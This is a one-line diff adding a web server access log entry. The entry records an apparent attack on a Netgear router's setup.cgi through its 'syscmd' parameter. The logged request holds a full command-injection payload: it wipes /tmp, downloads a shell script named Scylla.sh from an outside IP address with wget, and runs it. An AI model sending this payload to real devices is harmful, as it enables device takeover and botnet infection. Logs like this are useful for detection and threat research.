@@ -1,0 +1,1 @@
+36.112.155.38 - - [25/Jul/2020:07:08:08 +0300] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://37.49.224.98/Scylla.sh+-O+/tmp/Scylla.sh;sh+Scylla.sh&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 162 "-" "-" "-"
